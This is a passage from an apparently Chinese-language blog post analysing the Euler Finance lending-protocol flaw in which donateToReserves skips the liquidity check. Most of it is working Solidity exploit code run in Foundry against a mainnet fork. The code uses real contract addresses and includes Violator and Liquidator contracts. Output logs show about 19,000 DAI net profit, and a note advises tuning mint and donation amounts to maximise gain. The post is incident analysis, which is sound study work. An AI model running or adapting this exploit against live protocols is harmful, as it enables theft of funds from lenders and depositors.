函数中没有调用&lt;code&gt;checkLiquidity();&lt;/code&gt;进行账户流动性检查&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function donateToReserves(uint subAccountId, uint amount) external nonReentrant {&#xA;        (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER();&#xA;        address account = getSubAccount(msgSender, subAccountId);&#xA;&#xA;        updateAverageLiquidity(account);&#xA;        emit RequestDonate(account, amount);&#xA;&#xA;        AssetCache memory assetCache = loadAssetCache(underlying, assetStorage);&#xA;&#xA;        uint origBalance = assetStorage.users[account].balance;&#xA;        uint newBalance;&#xA;&#xA;        if (amount == type(uint).max) {&#xA;            amount = origBalance;&#xA;            newBalance = 0;&#xA;        } else {&#xA;            require(origBalance &amp;gt;= amount, &amp;#34;e/insufficient-balance&amp;#34;);&#xA;            unchecked { newBalance = origBalance - amount; }&#xA;        }&#xA;&#xA;        assetStorage.users[account].balance = encodeAmount(newBalance);&#xA;        assetStorage.reserveBalance = assetCache.reserveBalance = encodeSmallAmount(assetCache.reserveBalance &amp;#43; amount);&#xA;&#xA;        emit Withdraw(assetCache.underlying, account, amount);&#xA;        //!!! 注意是地址0&#xA;        emitViaProxy_Transfer(proxyAddr, account, address(0), amount);&#xA;&#xA;        logAssetStatus(assetCache);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中 &lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/BaseModule.sol#L40&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;emitViaProxy_Transfer(proxyAddr, account, address(0), amount)&lt;/a&gt; 函数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function emitViaProxy_Transfer(address proxyAddr, address from, address to, uint value) internal FREEMEM {&#xA;        (bool success,) = proxyAddr.call(abi.encodePacked(&#xA;                               uint8(3),&#xA;                               keccak256(bytes(&amp;#39;Transfer(address,address,uint256)&amp;#39;)),&#xA;                               bytes32(uint(uint160(from))),&#xA;                               bytes32(uint(uint160(to))),&#xA;                               value&#xA;                          ));&#xA;        require(success, &amp;#34;e/log-proxy-fail&amp;#34;);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么&lt;code&gt;donateToReserves()&lt;/code&gt;这个函数的含义就是：允许任何人将自己的eToken转移到地址0进行销毁。&lt;/p&gt;&#xA;&lt;p&gt;这就可以让用户轻易形成坏账&lt;/p&gt;&#xA;&lt;p&gt;示例：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 违规测试&#xA;contract ViolatorTest is Test {&#xA;    uint256 constant initialFunding = 80000 ether;&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;, 16_817_995);&#xA;    }&#xA;&#xA;    function checkHealth(address _who) private {&#xA;        //第一个参数是清算者地址， 不能传自己，否则会报错： [FAIL. Reason: e/liq/self-liquidation]&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(address(0), _who, address(DAI), address(DAI));&#xA;&#xA;        emit log_named_decimal_uint(&amp;#34;healthScore&amp;#34;, returnData.healthScore, 18);&#xA;    }&#xA;&#xA;    function testViolate() public {&#xA;        deal(address(DAI), address(this), initialFunding);&#xA;&#xA;        DAI.approve(address(EulerLiquidation), type(uint256).max);&#xA;        eDAI.deposit(0, 10000 ether);&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i got  eDAI after eDAI.deposit&amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have dDAI after eDAI.deposit&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        eDAI.mint(0, 50000 ether);&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have eDAI after eDAI.mint&amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have dDAI after eDAI.mint&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        //扔掉一部分eDAI&#xA;        eDAI.donateToReserves(0, 50000 ether); // 成功 (没有检查账户的流动性)&#xA;&#xA;        //检查财务健康状况，小于1表示资不抵债，只越小健康状况越糟糕，被清算时打折越厉害&#xA;        checkHealth(address(this));&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have eDAI at the end&amp;#34;,&#xA;            eDAI.balanceOfUnderlying(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;i have dDAI at the end&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;i have DAI at the end&amp;#34;,&#xA;            DAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;i lost DAI in this game&amp;#34;,&#xA;            (initialFunding - DAI.balanceOf(address(this))) / 1 ether&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testViolate() (gas: 475552)&#xA;Logs:&#xA;  i got  eDAI after eDAI.deposit 9784&#xA;  i have dDAI after eDAI.deposit 0&#xA;  i have eDAI after eDAI.mint 58704&#xA;  i have dDAI after eDAI.mint 50000&#xA;  healthScore: 0.151828871132557943&#xA;  i have eDAI at the end 8896&#xA;  i have dDAI at the end 50000&#xA;  i have DAI at the end 70000&#xA;  i lost DAI in this game 10000&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到，通过捐赠5万eToken, 用户健康分数可以变得非常低 0.1518。&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;漏洞利用&#34;&gt;&lt;span&gt;漏洞利用&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;上面展示漏洞的代码中我并没有去平账，没有还款也不能取回抵押物，让平台产生了坏账，但我也损失了10000DAI，所以其实是两败俱伤的场面。&lt;/p&gt;&#xA;&lt;p&gt;要做到盈利：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;违规者大量造成坏账，然后躺平， 不还账也不取回抵押&lt;/li&gt;&#xA;&lt;li&gt;自己充当清算者，对违规者进行清算，平台会将违规者的债务（dDAI）做打折处理移交给清算者，同时将违规者的eDAI也会移交给清算者&lt;/li&gt;&#xA;&lt;li&gt;只要清算者的获利（eDAI 减去 dDAI的差额） 大于 最初违规者的抵押金额加上各种手续费，那么总体而言就是盈利&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;具体清算算法参考： &lt;a href=&#34;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/Liquidation.sol#LL55C6-L55C6&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/Liquidation.sol#LL55C6-L55C6&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;注： 清算者需要新建一个合约，不能和违规者是同一个合约地址, 否则会报错：e/liq/self-liquidation&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;require(!isSubAccountOf(liqLocs.violator, liqLocs.liquidator), &amp;#34;e/liq/self-liquidation&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;示例：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// 违规者&#xA;contract Violator {&#xA;    function DoSometingEvil() external {&#xA;        DAI.approve(address(EulerLiquidation), type(uint256).max);&#xA;        //质押 1万&#xA;        eDAI.deposit(0, 10000 ether);&#xA;&#xA;        //贷款 19万&#xA;        eDAI.mint(0, 190000 ether);&#xA;&#xA;        //捐赠3万8&#xA;        eDAI.donateToReserves(0, 38000 ether); // 成功 (没有检查账户的流动性)&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Violator] eDAI at the end&amp;#34;,&#xA;            eDAI.balanceOfUnderlying(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Violator] dDAI at the end&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] DAI at the end&amp;#34;,&#xA;            DAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;    }&#xA;}&#xA;&#xA;// 清算者 &#xA;// 这里的 is Test 只是为了使用log_named_decimal_uint事件，并不真正是一个测试&#xA;contract Liquidator is Test {&#xA;    function liquidate(address liquidator, address violator) external {&#xA;        // 清算前，Liquidator没有eDAI,也没有dDAI&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] eDAI balance before liquidate: &amp;#34;,&#xA;            eDAI.balanceOf(liquidator) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] dDAI balance after liquidate: &amp;#34;,&#xA;            dDAI.balanceOf(liquidator) / 1e18&#xA;        );&#xA;&#xA;        // 计算清算机会&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(liquidator, violator, address(DAI), address(DAI));&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, repay: &amp;#34;,&#xA;            returnData.repay / 1e18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, yield: &amp;#34;,&#xA;            returnData.yield,&#xA;            18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, healthScore:: &amp;#34;,&#xA;            returnData.healthScore,&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, baseDiscount:&amp;#34;,&#xA;            returnData.baseDiscount,&#xA;            18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, discount:&amp;#34;,&#xA;            returnData.discount,&#xA;            18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, conversionRate:&amp;#34;,&#xA;            returnData.conversionRate,&#xA;            18&#xA;        );&#xA;&#xA;        // 清算&#xA;        Euler.liquidate(&#xA;            violator,&#xA;            address(DAI),&#xA;            address(DAI),&#xA;            returnData.repay,&#xA;            10 * 1e18&#xA;        );&#xA;&#xA;        //清算后， 违规者的eDAI被转移给清算者&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] eDAI balance after liquidate: &amp;#34;,&#xA;            eDAI.balanceOf(liquidator),&#xA;            18&#xA;        );&#xA;        // 清算后， 违规者的dDAI（负债）也被转移给清算者（负债会按照打折价格转移给清算者）&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] dDAI balance after liquidate: &amp;#34;,&#xA;            dDAI.balanceOf(liquidator),&#xA;            18&#xA;        );&#xA;&#xA;        // 平账&#xA;        eDAI.burn(0, dDAI.balanceOf(liquidator));&#xA;&#xA;        //提款&#xA;        eDAI.withdraw(0, eDAI.balanceOfUnderlying(liquidator));&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] dDAI balance after withdraw: &amp;#34;,&#xA;            dDAI.balanceOf(address(liquidator)),&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] DAI balance after withdraw: &amp;#34;,&#xA;            DAI.balanceOf(liquidator),&#xA;            18&#xA;        );&#xA;&#xA;        //转账&#xA;        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));&#xA;    }&#xA;}&#xA;&#xA;contract ViolatorTest is Test {&#xA;    uint256 constant initialFunding = 10000 ether;&#xA;    Violator violator;&#xA;    Liquidator liquidator;&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;, 16_817_995);&#xA;        violator = new Violator();&#xA;        liquidator = new Liquidator();&#xA;&#xA;        deal(address(DAI), address(violator), initialFunding);&#xA;    }&#xA;&#xA;    function checkHealth(address _who) private {&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(address(0), _who, address(DAI), address(DAI));&#xA;&#xA;        emit log_named_decimal_uint(&amp;#34;healthScore&amp;#34;, returnData.healthScore, 18);&#xA;    }&#xA;&#xA;    function testViolate() public {&#xA;        violator.DoSometingEvil();&#xA;        checkHealth(address(address(violator)));&#xA;        liquidator.liquidate(address(liquidator), address(violator));&#xA;        checkHealth(address(address(violator)));&#xA;        checkHealth(address(liquidator));&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;total earned:&amp;#34;,&#xA;            DAI.balanceOf(address(this)) - initialFunding,&#xA;            18&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testViolate() (gas: 829299)&#xA;Logs:&#xA;  [Violator] eDAI at the end 161161&#xA;  [Violator] dDAI at the end 190000&#xA;  [Violator] DAI at the end 0&#xA;  healthScore: 0.785018620737387352&#xA;  [Liquidator] eDAI balance before liquidate:  0&#xA;  [Liquidator] dDAI balance after liquidate:  0&#xA;  [Liquidator] checkLiquidation, repay:  131507&#xA;  [Liquidator] checkLiquidation, yield: : 161161.326251641854872000&#xA;  [Liquidator] checkLiquidation, healthScore:: : 0.785018620737387352&#xA;  [Liquidator] checkLiquidation, baseDiscount:: 0.234981379262612648&#xA;  [Liquidator] checkLiquidation, discount:: 0.200000000000000000&#xA;  [Liquidator] checkLiquidation, conversionRate:: 1.250000000000000000&#xA;  [Liquidator] eDAI balance after liquidate: : 157681.244144472883914003&#xA;  [Liquidator] dDAI balance after liquidate: : 131507.642221339753575552&#xA;  [Liquidator] dDAI balance after withdraw: : 0.000000000000000000&#xA;  [Liquidator] DAI balance after withdraw: : 29653.684030302101296446&#xA;  healthScore: 0.000000000000000000&#xA;  healthScore: 115792089237316195423570985008687907853269984665640564039457.584007913129639935&#xA;  total earned:: 19653.684030302101296446&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在上面的示例中， 违规者质押 1万 DAI, 进行一番骚操作后，造就了16万多的eDAI, 19万的dDAI, 健康度只有0.785， 然后躺平，等清算者进行清算， 清算者从违规者那里以打折价131507的价格（dDAI）拿到了157681的资产(eDAI)， 这里形成了一段差价，除去手续费、利息等杂费，清算者从平台划走29653， 减掉违规者质押成本1万， &lt;strong&gt;最终盈利19653美刀&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;注： 上面的代码中对于固定成本，在违规时需要不断尝试 不同 的mint数量和捐赠数量，以利益最大化&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;完整的poc代码&#34;&gt;&lt;span&gt;完整的POC代码&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%ae%8c%e6%95%b4%e7%9a%84poc%e4%bb%a3%e7%a0%81&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;&#xA;//EToken&#xA;// &amp;lt;https://docs.euler.finance/developers/getting-started/contract-reference#ieuleretoken&amp;gt;&#xA;interface EToken {&#xA;    //将底层代币从发送者转移到 Euler 池中，并增加账户的 eToken&#xA;    function deposit(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    //铸造 eToken 和相应数量的 dTokens（“自借”）&#xA;    function mint(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    //销毁 eToken 和相应数量的 dTokens （“自还”）&#xA;    function burn(uint subAccountId, uint amount) external;&#xA;&#xA;    //向储备金捐赠代币&#xA;    function donateToReserves(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    //将底层代币从 Euler 池中转移到发送方，并减少账户的 eTokens&#xA;    function withdraw(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    function balanceOf(address account) external view returns (uint);&#xA;&#xA;    function balanceOfUnderlying(address account) external view returns (uint);&#xA;&#xA;    function transfer(address to, uint amount) external returns (bool);&#xA;}&#xA;&#xA;//https://docs.euler.finance/developers/getting-started/contract-reference#ieulerdtoken&#xA;interface DToken {&#xA;    &#xA;    function repay(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    function balanceOf(address account) external view returns (uint);&#xA;}&#xA;&#xA;interface IEuler {&#xA;    //清算机会&#xA;    struct LiquidationOpportunity {&#xA;        //清算金额&#xA;        uint256 repay;&#xA;        //收益&#xA;        uint256 yield;&#xA;        //健康分数&#xA;        uint256 healthScore;&#xA;        //基础折扣&#xA;        uint256 baseDiscount;&#xA;        //折扣&#xA;        uint256 discount;&#xA;        //转换率&#xA;        uint256 conversionRate;&#xA;    }&#xA;&#xA;    function liquidate(&#xA;        //清算者&#xA;        address violator,&#xA;        //底层代币(将要偿还的代币)&#xA;        address underlying,&#xA;        //抵押代币&#xA;        address collateral,&#xA;        //违规者要转给sender的基础DToken的数量，单位为基础代币。&#xA;        uint256 repay,&#xA;        //违规者要转给sender的EToken的最低可接受数量&#xA;        uint256 minYield&#xA;    ) external;&#xA;&#xA;    //检查清算机会&#xA;    function checkLiquidation(&#xA;        //清算者&#xA;        address liquidator,&#xA;        //违规者&#xA;        address violator,&#xA;        //底层代币(将要偿还的代币)&#xA;        address underlying,&#xA;        //抵押代币&#xA;        address collateral&#xA;    ) external returns (LiquidationOpportunity memory liqOpp);&#xA;}&#xA;&#xA;interface IERC20 {&#xA;    function approve(address spender, uint256 amount) external returns (bool);&#xA;&#xA;    function balanceOf(address) external view returns (uint256);&#xA;&#xA;    function decimals() external view returns (uint8);&#xA;&#xA;    function transfer(&#xA;        address recipient,&#xA;        uint256 amount&#xA;    ) external returns (bool);&#xA;}&#xA;&#xA;// &amp;lt;https://docs.euler.finance/euler-protocol/addresses#mainnet&amp;gt;&#xA;IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);&#xA;address constant EulerLiquidation = 0x27182842E098f60e3D576794A5bFFb0777E025d3;&#xA;IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);&#xA;EToken constant eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);&#xA;DToken constant dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);&#xA;&#xA;contract Violator {&#xA;    function DoSometingEvil() external {&#xA;        DAI.approve(address(EulerLiquidation), type(uint256).max);&#xA;        //质押&#xA;        eDAI.deposit(0, 10000 ether);&#xA;&#xA;        //贷款&#xA;        eDAI.mint(0, 190000 ether);&#xA;&#xA;        //扔掉一部分eDAI&#xA;        eDAI.donateToReserves(0, 38000 ether); // 成功 (没有检查账户的流动性)&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Violator] eDAI at the end&amp;#34;,&#xA;            eDAI.balanceOfUnderlying(address(this)) / 1 ether&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Violator] dDAI at the end&amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] DAI at the end&amp;#34;,&#xA;            DAI.balanceOf(address(this)) / 1 ether&#xA;        );&#xA;    }&#xA;}&#xA;&#xA;contract Liquidator is Test {&#xA;    function liquidate(address liquidator, address violator) external {&#xA;        // 清算前，Liquidator没有eDAI,也没有dDAI&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] eDAI balance before liquidate: &amp;#34;,&#xA;            eDAI.balanceOf(liquidator) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] dDAI balance after liquidate: &amp;#34;,&#xA;            dDAI.balanceOf(liquidator) / 1e18&#xA;        );&#xA;&#xA;        // 计算清算机会&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(liquidator, violator, address(DAI), address(DAI));&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, repay: &amp;#34;,&#xA;            returnData.repay / 1e18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, yield: &amp;#34;,&#xA;            returnData.yield,&#xA;            18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, healthScore:: &amp;#34;,&#xA;            returnData.healthScore,&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, baseDiscount:&amp;#34;,&#xA;            returnData.baseDiscount,&#xA;            18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, discount:&amp;#34;,&#xA;            returnData.discount,&#xA;            18&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] checkLiquidation, conversionRate:&amp;#34;,&#xA;            returnData.conversionRate,&#xA;            18&#xA;        );&#xA;&#xA;        // 清算&#xA;        Euler.liquidate(&#xA;            violator,&#xA;            address(DAI),&#xA;            address(DAI),&#xA;            returnData.repay,&#xA;            10 * 1e18&#xA;        );&#xA;&#xA;        //清算后， 违规者的eDAI被转移给清算者&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] eDAI balance after liquidate: &amp;#34;,&#xA;            eDAI.balanceOf(liquidator),&#xA;            18&#xA;        );&#xA;        // 清算后， 违规者的dDAI（负债）也被转移给清算者（负债会按照打折价格转移给清算者）&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] dDAI balance after liquidate: &amp;#34;,&#xA;            dDAI.balanceOf(liquidator),&#xA;            18&#xA;        );&#xA;&#xA;        // 平账&#xA;        eDAI.burn(0, dDAI.balanceOf(liquidator));&#xA;&#xA;        //提款&#xA;        eDAI.withdraw(0, eDAI.balanceOfUnderlying(liquidator));&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] dDAI balance after withdraw: &amp;#34;,&#xA;            dDAI.balanceOf(address(liquidator)),&#xA;            18&#xA;        );&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[Liquidator] DAI balance after withdraw: &amp;#34;,&#xA;            DAI.balanceOf(liquidator),&#xA;            18&#xA;        );&#xA;&#xA;        //转账&#xA;        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));&#xA;    }&#xA;}&#xA;&#xA;contract ViolatorTest is Test {&#xA;    uint256 constant initialFunding = 10000 ether;&#xA;    Violator violator;&#xA;    Liquidator liquidator;&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;, 16_817_995);&#xA;        violator = new Violator();&#xA;        liquidator = new Liquidator();&#xA;&#xA;        deal(address(DAI), address(violator), initialFunding);&#xA;    }&#xA;&#xA;    function checkHealth(address _who) private {&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(address(0), _who, address(DAI), address(DAI));&#xA;&#xA;        emit log_named_decimal_uint(&amp;#34;healthScore&amp;#34;, returnData.healthScore, 18);&#xA;    }&#xA;&#xA;    function testViolate() public {&#xA;        violator.DoSometingEvil();&#xA;        checkHealth(address(address(violator)));&#xA;        liquidator.liquidate(address(liquidator), address(violator));&#xA;        checkHealth(address(address(violator)));&#xA;        checkHealth(address(liquidator));&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;total earned:&amp;#34;,&#xA;            DAI.balanceOf(address(this)) - initialFunding,&#xA;            18&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testViolate() (gas: 860010)&#xA;Logs:&#xA;  [Violator] eDAI at the end 161161&#xA;  [Violator] dDAI at the end 190000&#xA;  [Violator] DAI at the end 0&#xA;  healthScore: 0.785018620737387352&#xA;  [Liquidator] eDAI balance before liquidate:  0&#xA;  [Liquidator] dDAI balance after liquidate:  0&#xA;  [Liquidator] checkLiquidation, repay:  131507&#xA;  [Liquidator] checkLiquidation, yield: : 161161.326251641854872000&#xA;  [Liquidator] checkLiquidation, healthScore:: : 0.785018620737387352&#xA;  [Liquidator] checkLiquidation, baseDiscount:: 0.234981379262612648&#xA;  [Liquidator] checkLiquidation, discount:: 0.200000000000000000&#xA;  [Liquidator] checkLiquidation, conversionRate:: 1.250000000000000000&#xA;  [Liquidator] eDAI balance after liquidate: : 157681.244144472883914003&#xA;  [Liquidator] dDAI balance after liquidate: : 131507.642221339753575552&#xA;  [Liquidator] dDAI balance after withdraw: : 0.000000000000000000&#xA;  [Liquidator] DAI balance after withdraw: : 29013.348922583010640175&#xA;  healthScore: 0.000000000000000000&#xA;  healthScore: 115792089237316195423570985008687907853269984665640564039457.584007913129639935&#xA;  total earned:: 19013.348922583010640175&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成本1万，净利润19013刀&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;黑客攻击模拟代码&#34;&gt;&lt;span&gt;黑客攻击模拟代码&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e9%bb%91%e5%ae%a2%e6%94%bb%e5%87%bb%e6%a8%a1%e6%8b%9f%e4%bb%a3%e7%a0%81&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;tx： &lt;a href=&#34;https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 